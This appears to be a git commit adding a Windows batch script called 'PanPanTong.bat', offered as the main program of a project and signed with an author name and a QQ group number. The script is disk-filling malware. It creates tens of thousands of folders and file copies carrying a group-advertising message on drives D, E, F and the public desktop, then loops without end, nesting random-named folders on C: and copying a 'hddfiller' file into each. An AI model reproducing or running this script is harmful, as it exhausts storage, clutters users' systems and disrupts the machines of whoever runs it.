e321c7c7bc884c2528d0a06fc78ae172ab3d61ae
小曹2015 <a50656036@163.com>
2016-08-01 14:47:44 +0800

    盘盘通的主程序

---
+++ PanPanTong.bat
@@ -0,0 +1,69 @@
+@echo off
+echo 欢迎来到小曹铁路盘盘通的世界
+echo 作者：小曹2015 qq群：221312284
+dir 
+cd xcrail
+for /l %%a in (1,1,15000) do md d:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件夹）
+for /l %%a in (1,1,15000) do md e:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件夹）
+for /l %%a in (1,1,15000) do md f:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件夹）
+for /l %%a in (1,1,15000) do copy set.xcdata d:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
+for /l %%a in (1,1,15000) do copy set.xcdata e:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
+for /l %%a in (1,1,15000) do copy set.xcdata f:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
+for /l %%a in (1,1,15000) do copy set.xcdata C:\Users\Public\Desktop\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
+
+cd c:
+c:
+:xctlh
+set num=%RANDOM%
+md 小曹铁路好，%num%
+copy hddfiller 小曹铁路好，%num%\hddfiller
+cd 小曹铁路好，%num%
+set num=%RANDOM%
+md %num%
+copy hddfiller %num%\hddfiller
+cd %num%
+set num=%RANDOM%
+md %num%
+copy hddfiller %num%\hddfiller
+cd %num%
+set num=%RANDOM%
+md %num%
+copy hddfiller %num%\hddfiller
+cd %num%
+set num=%RANDOM%
+md %num%
+copy hddfiller %num%\hddfiller
+cd %num%
+set num=%RANDOM%
+md %num%
+copy hddfiller %num%\hddfiller
+cd %num%
+set num=%RANDOM%
+md %num%
+copy hddfiller %num%\hddfiller
+cd %num%
+set num=%RANDOM%
+md %num%
+copy hddfiller %num%\hddfiller
+cd %num%
+set num=%RANDOM%
+md %num%
+copy hddfiller %num%\hddfiller
+cd %num%
+set num=%RANDOM%
+md %num%
+copy hddfiller %num%\hddfiller
+cd %num%
+
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+
+goto xctlh
